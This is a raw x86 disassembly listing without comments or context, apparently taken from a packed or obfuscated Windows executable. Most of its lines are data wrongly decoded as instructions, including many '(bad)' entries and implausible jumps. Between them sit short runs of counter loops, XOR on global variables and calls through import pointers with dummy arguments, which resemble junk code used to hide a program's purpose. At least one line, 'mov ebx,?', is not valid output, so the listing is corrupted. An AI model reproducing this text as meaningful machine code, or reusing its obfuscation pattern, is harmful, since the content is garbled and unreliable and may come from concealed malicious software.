  40b83e:	test   DWORD PTR [edx],0xcc628562
  40b844:	xchg   ebx,eax
  40b845:	inc    ecx
  40b846:	outs   dx,BYTE PTR ds:[esi]
  40b847:	xor    DWORD PTR [ebp-0x35],eax
  40b84a:	xchg   ebp,ebx
  40b84c:	xlat   BYTE PTR ds:[ebx]
  40b84d:	test   ah,0xf6
  40b850:	shr    BYTE PTR [esp+esi*1],0x8a
  40b854:	aad    0x2a
  40b856:	mov    esi,0x6deeffc1
  40b85b:	xor    edi,DWORD PTR [ecx+0x69e1c9ee]
  40b861:	daa    
  40b862:	(bad)  
  40b864:	jmp    0x40b8e2
  40b866:	nop
  40b867:	xchg   edi,eax
  40b868:	inc    eax
  40b869:	(bad)  
  40b86a:	pop    ss
  40b86b:	(bad)  
  40b86c:	xlat   BYTE PTR ds:[ebx]
  40b86d:	inc    edx
  40b86e:	mov    dl,0x4
  40b870:	mov    dl,0x3f
  40b872:	pop    ecx
  40b873:	jge    0x40b897
  40b875:	ficom  DWORD PTR [eax+0x0]
  40b878:	cmp    al,0x24
  40b87a:	cmp    al,0xab
  40b87c:	ret    
  40b87d:	and    ecx,ebp
  40b87f:	mov    cl,0x4d
  40b881:	cmp    al,0xbe
  40b883:	rol    ebx,1
  40b885:	inc    eax
  40b886:	xor    bl,BYTE PTR [edx]
  40b888:	outs   dx,DWORD PTR ds:[esi]
  40b889:	cmp    BYTE PTR [esi],bh
  40b88b:	jno    0x40b834
  40b88d:	sbb    al,0x7c
  40b88f:	adc    al,0x63
  40b891:	adc    DWORD PTR [esi],ebx
  40b893:	int    0x4c
  40b895:	rol    BYTE PTR [esi],cl
  40b897:	stos   BYTE PTR es:[edi],al
  40b898:	xchg   ebx,ebx
  40b89a:	call   0x6ec61077
  40b89f:	cmp    cl,BYTE PTR [esi-0x74]
  40b8a2:	xchg   ebx,eax
  40b8a3:	push   ebp
  40b8a4:	adc    BYTE PTR [edx+0x1e],bh
  40b8a7:	outs   dx,BYTE PTR ds:[esi]
  40b8a8:	aaa    
  40b8a9:	je     0x40b8c9
  40b8ab:	add    BYTE PTR [edx],dh
  40b8ad:	or     BYTE PTR [esi+0x340243f6],0xf1
  40b8b4:	ja     0x40b927
  40b8b6:	mov    ecx,0x3cbeca1c
  40b8bb:	mov    dh,0x6f
  40b8bd:	mov    eax,ds:0xf514e9ac
  40b8c2:	inc    ecx
  40b8c3:	pop    ebx
  40b8c4:	or     cl,bh
  40b8c6:	and    edx,DWORD PTR [ecx]
  40b8c8:	jno    0x40b89b
  40b8ca:	jae    0x40b889
  40b8cc:	inc    edx
  40b8cd:	out    dx,eax
  40b8ce:	loopne 0x40b867
  40b8d0:	push   edx
  40b8d1:	cmp    al,0x5
  40b8d3:	(bad)  
  40b8d5:	fcom   QWORD PTR [ebx]
  40b8d7:	mov    esi,0x25cece7
  40b8dc:	jno    0x40b92d
  40b8de:	lods   eax,DWORD PTR ds:[esi]
  40b8df:	scas   eax,DWORD PTR es:[edi]
  40b8e0:	and    ah,BYTE PTR [ecx+0x6206654d]
  40b8e6:	scas   al,BYTE PTR es:[edi]
  40b8e7:	cmp    bl,al
  40b8e9:	xor    al,0xa4
  40b8eb:	or     DWORD PTR [ebp+0x139728a0],eax
  40b8f1:	fcom   DWORD PTR [ecx+ebp*4-0x35]
  40b8f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f6:	pop    esi
  40b8f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f8:	mov    ebp,0xec75896d
  40b8fd:	sbb    ecx,DWORD PTR ds:0x4306c6
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430616
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43061e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x430626,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42efa8,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42efac,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42efa0,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	and    ch,0x8f
  40b962:	pop    ecx
  40b963:	mov    ecx,0x7e7ef83e
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b942
  40b96d:	dec    esp
  40b96e:	aas    
  40b96f:	stos   BYTE PTR es:[edi],al
  40b970:	xor    al,dl
  40b972:	sahf   
  40b973:	xor    eax,0x766fb231
  40b978:	jnp    0x40b960
  40b97a:	outs   dx,BYTE PTR ds:[esi]
  40b97b:	xor    BYTE PTR [edi+eax*1+0x7d],al
  40b97f:	add    BYTE PTR ds:0xb4d79a31,bh
  40b985:	daa    
  40b986:	adc    bh,BYTE PTR [edx-0x58]
  40b989:	loope  0x40b943
  40b98b:	ret    
  40b98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b98d:	fcom   st(3)
  40b98f:	stos   BYTE PTR es:[edi],al
  40b990:	inc    ebx
  40b991:	adc    edx,ebp
  40b993:	arpl   WORD PTR [ebx+0x2442be75],bp
  40b999:	dec    ebp
  40b99a:	xor    cl,BYTE PTR [eax]
  40b99c:	loop   0x40b9a5
  40b99e:	mov    esi,0xd573de3e
  40b9a3:	mov    esi,0x55c4726f
  40b9a8:	push   ecx
  40b9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9aa:	xchg   esp,eax
  40b9ab:	adc    BYTE PTR [eax-0x1],ch
  40b9ae:	leave  
  40b9af:	in     al,dx
  40b9b0:	cwde   
  40b9b1:	mov    al,ds:0xe319e389
  40b9b6:	ret    
  40b9b7:	jl     0x40ba15
  40b9b9:	pop    esp
  40b9ba:	sahf   
  40b9bb:	mov    esp,0x80e6beda
  40b9c0:	mov    ah,BYTE PTR [esi-0x24]
  40b9c3:	add    ebx,DWORD PTR ds:0x15b2605c
  40b9c9:	inc    edx
  40b9ca:	shl    BYTE PTR [esi+0x43],0xf2
  40b9ce:	das    
  40b9cf:	mov    ecx,0x8c4ad398
  40b9d4:	ins    DWORD PTR es:[edi],dx
  40b9d5:	mov    ds:0xeb7b4def,al
  40b9da:	hlt    
  40b9db:	outs   dx,BYTE PTR ds:[esi]
  40b9dc:	push   esp
  40b9dd:	or     al,0xb9
  40b9df:	stos   DWORD PTR es:[edi],eax
  40b9e0:	lods   eax,DWORD PTR ds:[esi]
  40b9e1:	push   edi
  40b9e2:	dec    edx
  40b9e3:	xor    al,0x28
  40b9e5:	fs aam 0x20
  40b9e8:	addr16 xor al,0xd
  40b9eb:	mov    ebp,0x5bc23b1c
  40b9f0:	bound  esi,QWORD PTR [edx+edx*4]
  40b9f3:	pop    ebp
  40b9f4:	push   0xf4fc29be
  40b9f9:	pop    ss
  40b9fa:	pop    esp
  40b9fb:	(bad)  
  40b9fc:	outs   dx,DWORD PTR ds:[esi]
  40b9fd:	and    eax,0x50fefdcd
  40ba02:	or     DWORD PTR [esi],ebx
  40ba04:	jbe    0x40b9e9
  40ba06:	xchg   edx,eax
  40ba07:	mul    BYTE PTR [edx+0x37d113b8]
  40ba0d:	push   ebp
  40ba0e:	or     eax,0xc7ebf6ce
  40ba13:	stos   BYTE PTR es:[edi],al
  40ba14:	test   BYTE PTR [ecx*2+0xda00a09],dl
  40ba1b:	mov    ebp,0x5530abf1
  40ba20:	add    eax,0x53daa653
  40ba25:	ret    
  40ba26:	mov    ah,cl
  40ba28:	cmp    dh,BYTE PTR [ebp+0x7392808a]
  40ba2e:	add    ah,al
  40ba30:	and    BYTE PTR [edi-0x394dd1ef],0xa9
  40ba37:	ja     0x40ba60
  40ba39:	idiv   DWORD PTR [ebx+edx*1-0x3b]
  40ba3d:	lea    esi,[edx-0x7e]
  40ba40:	jno    0x40b9ff
  40ba42:	out    0x55,eax
  40ba44:	inc    ebx
  40ba45:	and    BYTE PTR [ebx+0x6be41871],al
  40ba4b:	fst    QWORD PTR [ebp+0x48]
  40ba4e:	iret   
  40ba4f:	mov    ebx,0xa22b7a8b
  40ba54:	call   DWORD PTR [edx-0x54]
  40ba57:	dec    ebp
  40ba58:	sahf   
  40ba59:	ss std 
  40ba5b:	push   edx
  40ba5c:	mov    esi,edi
  40ba5e:	xor    edi,eax
  40ba60:	and    eax,0x68f44554
  40ba65:	adc    eax,0x69f89249
  40ba6a:	cwde   
  40ba6b:	pop    ebx
  40ba6c:	loope  0x40ba15
  40ba6e:	scas   eax,DWORD PTR es:[edi]
  40ba6f:	sahf   
  40ba70:	mov    edi,0x85facd5c
  40ba75:	mov    BYTE PTR ds:[ebp-0x280ab7c4],0xa0
  40ba7d:	xor    esp,esi
  40ba7f:	fs gs std 
  40ba82:	sub    edi,DWORD PTR [eax-0xa456367]
  40ba88:	xor    eax,0x1ca0ba90
  40ba8d:	push   ebp
  40ba8e:	pop    edx
  40ba8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba90:	mov    dh,0xe6
  40ba92:	scas   al,BYTE PTR es:[edi]
  40ba93:	pop    ds
  40ba94:	mov    bh,0xdc
  40ba96:	scas   eax,DWORD PTR es:[edi]
  40ba97:	inc    esp
  40ba98:	cmc    
  40ba99:	popa   
  40ba9a:	fwait
  40ba9b:	xor    DWORD PTR [eax],edx
  40ba9d:	mov    al,0x45
  40ba9f:	and    DWORD PTR [edx+eax*2-0xa],esp
  40baa3:	cdq    
  40baa4:	push   ds
  40baa5:	xor    BYTE PTR [edi+0x63],dl
  40baa8:	(bad)  
  40baa9:	pop    edi
  40baaa:	aad    0x79
  40baac:	fwait
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42efa0,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430616,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42efa8,0x42ef94
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ef9c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ef9c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ef9c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ef9c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ed54
  40bb1b:	cmp    DWORD PTR ds:0x42ef9c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x4306d6
  40bb2e:	xor    DWORD PTR ds:0x430636,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x430632,0x43061a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	mov    al,0x85
  40bb58:	xor    bl,BYTE PTR [ebp-0x1]
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb11
  40bb63:	outs   dx,DWORD PTR ds:[esi]
  40bb64:	inc    esp
  40bb65:	inc    esi
  40bb66:	(bad)  
  40bb67:	jmp    0xbe8e:0xc805eade
  40bb6e:	mov    bh,0x45
  40bb70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb71:	pop    eax
  40bb72:	cs cmp dh,bh
  40bb75:	inc    edi
  40bb76:	lahf   
  40bb77:	add    BYTE PTR [ecx],dl
  40bb79:	cli    
  40bb7a:	mov    al,0x79
  40bb7c:	sub    ecx,eax
  40bb7e:	data16 (bad) 
  40bb80:	inc    esp
  40bb81:	lea    edi,[ebp-0x40d09106]
  40bb87:	dec    esi
  40bb88:	pop    esp
  40bb89:	scas   al,BYTE PTR es:[edi]
  40bb8a:	clc    
  40bb8b:	mov    cx,0x3216
  40bb8f:	out    dx,eax
  40bb90:	mov    ecx,esp
  40bb92:	mov    ds:0x9511fe10,eax
  40bb97:	jo     0x40bbb8
  40bb99:	(bad)  
  40bb9a:	or     bh,dh
  40bb9c:	sbb    esi,edx
  40bb9e:	loope  0x40bb91
  40bba0:	rcr    DWORD PTR [edx+0x22],1
  40bba3:	dec    ebx
  40bba4:	jle    0x40bbd6
  40bba6:	inc    ecx
  40bba7:	push   edx
  40bba8:	cmp    DWORD PTR [eax-0x1316f752],esi
  40bbae:	and    al,0xa
  40bbb0:	(bad)  
  40bbb1:	sahf   
  40bbb2:	inc    ecx
  40bbb3:	push   esi
  40bbb4:	les    edx,FWORD PTR [ebp+0x58ff04bc]
  40bbba:	outs   dx,BYTE PTR ds:[esi]
  40bbbb:	or     DWORD PTR [ecx+0xb],esi
  40bbbe:	dec    esi
  40bbbf:	and    eax,eax
  40bbc1:	neg    cl
  40bbc3:	outs   dx,BYTE PTR ds:[esi]
  40bbc4:	imul   ebx,DWORD PTR [ebp+0x286baa51],0x57
  40bbcb:	fcomp  DWORD PTR [ebx+0x86a422c]
  40bbd1:	mov    eax,0xe4459d27
  40bbd6:	not    bh
  40bbd8:	xor    ebp,ebp
  40bbda:	xor    edi,DWORD PTR [ecx-0x5d]
  40bbdd:	sbb    bh,bl
  40bbdf:	sub    ch,BYTE PTR [ebp-0x49e8c1d9]
  40bbe5:	(bad)  
  40bbe7:	xchg   esi,eax
  40bbe8:	inc    eax
  40bbe9:	mov    ds:0x9674ff9e,al
  40bbee:	mov    bh,0xc2
  40bbf0:	jae    0x40bbff
  40bbf2:	mov    edx,esi
  40bbf4:	lods   al,BYTE PTR ds:[esi]
  40bbf5:	or     al,0x53
  40bbf7:	in     eax,dx
  40bbf8:	lock pop ebx
  40bbfa:	outs   dx,BYTE PTR ds:[esi]
  40bbfb:	popa   
  40bbfc:	dec    edx
  40bbfd:	dec    esi
  40bbfe:	xor    eax,0x78a10331
  40bc03:	push   edx
  40bc04:	adc    al,0x9
  40bc06:	mov    bh,0xe
  40bc08:	test   al,0x7c
  40bc0a:	cdq    
  40bc0b:	dec    esi
  40bc0c:	enter  0x4e5d,0x99
  40bc10:	or     BYTE PTR [edi+0x47],al
  40bc13:	push   edx
  40bc14:	dec    ecx
  40bc15:	push   ecx
  40bc16:	dec    ebp
  40bc17:	xchg   edx,eax
  40bc18:	(bad)  
  40bc19:	pop    ebp
  40bc1a:	sub    DWORD PTR [eax],edi
  40bc1c:	sub    DWORD PTR [eax+0x4232c08f],ebp
  40bc22:	in     eax,dx
  40bc23:	pushf  
  40bc24:	(bad)  
  40bc25:	xchg   esp,eax
  40bc26:	mov    edx,0xf535ffa4
  40bc2b:	mov    ecx,0xa6db8fc1
  40bc30:	mov    cs,ebx
  40bc32:	(bad)  
  40bc34:	push   0x3d
  40bc36:	sbb    ebx,DWORD PTR [ecx]
  40bc38:	dec    ecx
  40bc39:	fdivp  st(2),st
  40bc3b:	mov    ah,0x1
  40bc3d:	push   edi
  40bc3e:	es sub eax,eax
  40bc41:	outs   dx,BYTE PTR ds:[esi]
  40bc42:	(bad)  
  40bc43:	es retf 
  40bc45:	ror    BYTE PTR [ebx+ebp*1-0x76],cl
  40bc49:	xchg   dh,dl
  40bc4b:	push   eax
  40bc4c:	jnp    0x40bc7d
  40bc4e:	out    dx,al
  40bc4f:	sub    esi,esp
  40bc51:	cld    
  40bc52:	popa   
  40bc53:	xchg   ecx,eax
  40bc54:	fsubp  st(0),st
  40bc56:	add    al,0xb3
  40bc58:	xchg   ecx,eax
  40bc59:	cmp    ebp,DWORD PTR [esi+0x23406f6]
  40bc5f:	bound  ebp,QWORD PTR [ebp-0x31199f7b]
  40bc65:	and    DWORD PTR [eax+0x5f],eax
  40bc68:	mov    ds:0x6d54aa1e,eax
  40bc6d:	popf   
  40bc6e:	cmp    bh,bl
  40bc70:	push   0xffffffe9
  40bc72:	and    edx,edi
  40bc74:	shr    BYTE PTR [ecx-0x5fc05161],0x1a
  40bc7b:	fadd   DWORD PTR [edi+0x6e4e02c7]
  40bc81:	(bad)  
  40bc82:	jmp    FWORD PTR [edi]
  40bc84:	sub    DWORD PTR [esi],ebx
  40bc86:	jp     0x40bcdd
  40bc88:	sti    
  40bc89:	inc    edx
  40bc8a:	sahf   
  40bc8b:	mov    bh,0x14
  40bc8d:	inc    DWORD PTR [esi-0x1f]
  40bc90:	(bad)  
  40bc92:	inc    eax
  40bc93:	daa    
  40bc94:	jmp    0x7fec73c7
  40bc99:	imul   ebx,esp,0xffffff8c
  40bc9c:	mov    ebx,0xa1e58a0f
  40bca1:	test   al,0x94
  40bca3:	add    eax,ebx
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x4306d2,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x4306ce,0x42efb0
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x43063e,0x4306c6
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x430642,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x430642
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x430642,ecx
  40bcf2:	cmp    DWORD PTR ds:0x430642,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x430642,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x430622
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ebac
  40bd1f:	cmp    DWORD PTR ds:0x430642,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x430642
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x430642,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e8f2,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430616
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x4306da,0x4306d2
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ef90,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x430632,0x19
  40bd88:	cmp    DWORD PTR ds:0x430632,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x430632,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ebb0
  40bdad:	mov    ecx,DWORD PTR ds:0x430632
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x430632,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x4306da
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	outs   dx,DWORD PTR ds:[esi]
  40bddd:	dec    ecx
  40bdde:	(bad)  
  40bddf:	fs mov al,0xfa
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40bdf2
  40bde9:	add    al,0x3d
  40bdeb:	jl     0x40bdee
  40bded:	pop    es
  40bdee:	jo     0x40bdcb
  40bdf0:	xchg   ecx,eax
  40bdf1:	ret    0x5575
  40bdf4:	add    eax,0x4567d15
  40bdf9:	fwait
  40bdfa:	mov    eax,0x1a51a24a
  40bdff:	sbb    edx,edx
  40be01:	test   BYTE PTR [edi+eiz*2],0xf0
  40be05:	inc    esi
  40be06:	cmp    al,0xdc
  40be08:	cmp    dl,BYTE PTR [esi+edx*8+0x686660bd]
  40be0f:	and    eax,0x20a34f93
  40be14:	mov    ebp,0x18687549
  40be19:	cdq    
  40be1a:	jae    0x40bda3
  40be1c:	mov    eax,0xed739148
  40be21:	clc    
  40be22:	or     eax,0x55042741
  40be27:	mov    edi,0xa3076884
  40be2c:	xchg   edi,eax
  40be2d:	jg     0x40be9b
  40be2f:	mov    eax,ds:0xdbeeaaa9
  40be34:	push   ecx
  40be35:	inc    ebx
  40be36:	mov    al,ds:0x9da9b185
  40be3b:	or     al,0x28
  40be3d:	or     DWORD PTR ds:0x4ac48363,0x783800b
  40be47:	in     eax,0x84
  40be49:	mov    ah,0x53
  40be4b:	sbb    al,0xcd
  40be4d:	nop
  40be4e:	rcl    esp,cl
  40be50:	nop
  40be51:	push   edi
  40be52:	ror    DWORD PTR [ecx],cl
  40be54:	mov    ah,0xbf
  40be56:	out    0x3b,eax
  40be58:	push   0x7fd16a5a
  40be5d:	mov    eax,0xe35642d5
  40be62:	jae    0x40be40
  40be64:	out    0xaa,eax
  40be66:	inc    ebp
  40be67:	add    BYTE PTR [ecx],dh
  40be69:	outs   dx,BYTE PTR ds:[esi]
  40be6a:	imul   BYTE PTR [eax+0x36d95fe3]
  40be70:	popa   
  40be71:	jnp    0x40bef2
  40be73:	daa    
  40be74:	pop    ecx
  40be75:	dec    edi
  40be76:	mov    ds:0x11bc305a,eax
  40be7b:	fld    DWORD PTR [ecx+0x4]
  40be7e:	sbb    al,0x73
  40be80:	jge    0x40bee4
  40be82:	aaa    
  40be83:	inc    ebp
  40be84:	cmc    
  40be85:	mov    BYTE PTR cs:[ecx+esi*1-0x186ca0c8],dl
  40be8d:	in     al,dx
  40be8e:	xor    BYTE PTR [edx+0x6c],dh
  40be91:	mov    WORD PTR [esi-0x4630f765],ss
  40be97:	in     al,0x70
  40be99:	dec    ebp
  40be9a:	cmp    BYTE PTR [eax],0xbe
  40be9d:	sbb    esp,esi
  40be9f:	jne    0x40bf13
  40bea1:	cmp    al,0xc2
  40bea3:	neg    BYTE PTR [edi-0x1a]
  40bea6:	push   esp
  40bea7:	push   cs
  40bea8:	mul    DWORD PTR [edi+edi*8-0x23ffc5c9]
  40beaf:	stos   DWORD PTR es:[edi],eax
  40beb0:	pop    esp
  40beb1:	or     eax,0xf412a114
  40beb6:	sub    bl,BYTE PTR [ecx+0x2ff1f17e]
  40bebc:	inc    ch
  40bebe:	or     DWORD PTR [edx+0x13],ecx
  40bec1:	push   ss
  40bec2:	(bad)  
  40bec4:	cs jb  0x40be67
  40bec7:	add    DWORD PTR [esi],0xb15dcbd5
  40becd:	pop    ds
  40bece:	jp     0x40bf1a
  40bed0:	jge    0x40be7e
  40bed2:	xor    BYTE PTR [edx],ah
  40bed4:	(bad)  
  40bed5:	je     0x40be90
  40bed7:	push   ss
  40bed8:	scas   al,BYTE PTR es:[edi]
  40bed9:	fldenv [esp+ebp*2-0x15]
  40bedd:	or     DWORD PTR [esi+eiz*2+0x17c4de99],esi
  40bee4:	ins    DWORD PTR es:[edi],dx
  40bee5:	push   ds
  40bee6:	mov    al,BYTE PTR [ebx]
  40bee8:	fst    QWORD PTR [edx]
  40beea:	daa    
  40beeb:	imul   esi,DWORD PTR [edx-0x784445e2],0x4e
  40bef2:	inc    ecx
  40bef3:	or     al,0xe3
  40bef5:	retf   0x3d74
  40bef8:	gs cs loop 0x40bed0
  40befc:	add    cl,dl
  40befe:	mov    bh,BYTE PTR [eax-0x71]
  40bf01:	xor    BYTE PTR [edx-0x5c],ch
  40bf04:	cmp    al,0x2a
  40bf06:	je     0x40be94
  40bf08:	mov    eax,ebx
  40bf0a:	and    bl,dl
  40bf0c:	adc    DWORD PTR [ecx+esi*1],ebx
  40bf0f:	cdq    
  40bf10:	xor    al,0x2
  40bf12:	popa   
  40bf13:	jae    0x40bf4b
  40bf15:	add    eax,0xe95d05e2
  40bf1a:	and    BYTE PTR [esi-0x3b],al
  40bf1d:	inc    ebp
  40bf1e:	xor    WORD PTR [esi+0x1d19c05c],ax
  40bf25:	fbld   TBYTE PTR [ebp+0x458b5abe]
  40bf2b:	in     al,dx
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x430626,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	xchg   edi,eax
  40bf4b:	shl    DWORD PTR [edi-0x69],0x71
  40bf4f:	cld    
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf96
  40bf57:	retf   0x56df
  40bf5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf5b:	dec    edi
  40bf5c:	push   ss
  40bf5d:	fiadd  WORD PTR [ebp-0x5083c6ac]
  40bf63:	dec    ebp
  40bf64:	inc    esp
  40bf65:	std    
  40bf66:	jecxz  0x40bf65
  40bf68:	inc    edi
  40bf69:	test   edi,edx
  40bf6b:	dec    ebp
  40bf6c:	mov    cl,BYTE PTR [ebx-0x2492525c]
  40bf72:	leave  
  40bf73:	rol    BYTE PTR [ecx-0x12489f86],cl
  40bf79:	div    DWORD PTR [eax+0x192da762]
  40bf7f:	add    BYTE PTR ds:0x328a3b90,cl
  40bf85:	pop    edi
  40bf86:	lods   al,BYTE PTR ds:[esi]
  40bf87:	pop    esi
  40bf88:	jl     0x40bf63
  40bf8a:	xor    eax,esi
  40bf8c:	push   0x7481a51
  40bf91:	imul   ebp,DWORD PTR [edx+0x7fd104c2],0x1253bd08
  40bf9b:	mov    ch,0x67
  40bf9d:	xchg   edx,eax
  40bf9e:	dec    esp
  40bf9f:	xor    eax,0x6d4fa927
  40bfa4:	mov    bh,0x96
  40bfa6:	or     DWORD PTR [edx+0x1de76a73],esi
  40bfac:	sub    al,0x95
  40bfae:	int    0x20
  40bfb0:	adc    DWORD PTR [edx],ebx
  40bfb2:	pop    esi
  40bfb3:	lods   eax,DWORD PTR ds:[esi]
  40bfb4:	pop    edx
  40bfb5:	test   BYTE PTR [ebp-0x17d20d4b],cl
  40bfbb:	mov    al,ds:0xc618fb0d
  40bfc0:	test   eax,0x2055adfc
  40bfc5:	sbb    ebx,ebp
  40bfc7:	inc    esp
  40bfc8:	mul    DWORD PTR [edi+0x298e1ce7]
  40bfce:	call   0x6ea6b69a
  40bfd3:	mov    bl,0xbe
  40bfd5:	fwait
  40bfd6:	push   edx
  40bfd7:	or     eax,0x27649fcd
  40bfdc:	inc    eax
  40bfdd:	push   esi
  40bfde:	psadbw mm7,QWORD PTR [ecx]
  40bfe1:	cmp    BYTE PTR [ecx+0x6172d8fb],0xb2
  40bfe8:	jo     0x40c051
  40bfea:	popf   
  40bfeb:	and    edi,esi
  40bfed:	push   ds
  40bfee:	aas    
  40bfef:	push   0xac6f1592
  40bff4:	pop    esi
  40bff5:	retf   
  40bff6:	push   0x509f0234
  40bffb:	(bad)
  40bffe:	inc    ecx
  40bfff:	mov    ebx,?
  40c001:	pop    ss
  40c002:	fcmove st,st(1)
  40c004:	mov    BYTE PTR [ecx-0x61],dh
  40c007:	inc    ebp
  40c008:	cwde   
  40c009:	mov    bh,0x14
  40c00b:	dec    edi
  40c00c:	and    al,0x19
  40c00e:	cs addr16 loop 0x40bfcd
  40c012:	pop    esi
  40c013:	or     DWORD PTR [ecx],edx
  40c015:	js     0x40c01a
  40c017:	rcr    BYTE PTR [edx+eiz*1+0x3f],1
  40c01b:	stc    
  40c01c:	retf   0xe05c
  40c01f:	dec    eax
  40c020:	mov    al,BYTE PTR [eax+0x469bf61c]
  40c026:	icebp  
  40c027:	xchg   ebx,eax
  40c028:	mov    ebx,0x66735148
  40c02d:	xor    DWORD PTR [ebx+0xc],edx
  40c030:	stos   DWORD PTR es:[edi],eax
  40c031:	scas   al,BYTE PTR es:[edi]
  40c032:	jne    0x40c053
  40c034:	arpl   cx,dx
  40c036:	in     eax,0xae
  40c038:	in     al,0x9f
  40c03a:	loop   0x40c0a5
  40c03c:	mov    dh,0xd9
  40c03e:	push   ebp
  40c03f:	adc    al,0xe7
  40c041:	aas    
  40c042:	inc    ebx
  40c043:	jb     0x40c09d
  40c045:	add    eax,0xbfe8cd34
  40c04a:	jbe    0x40c070
  40c04c:	cmp    al,0x1a
  40c04e:	sbb    ebx,esi
  40c050:	xor    cl,BYTE PTR [ebx]
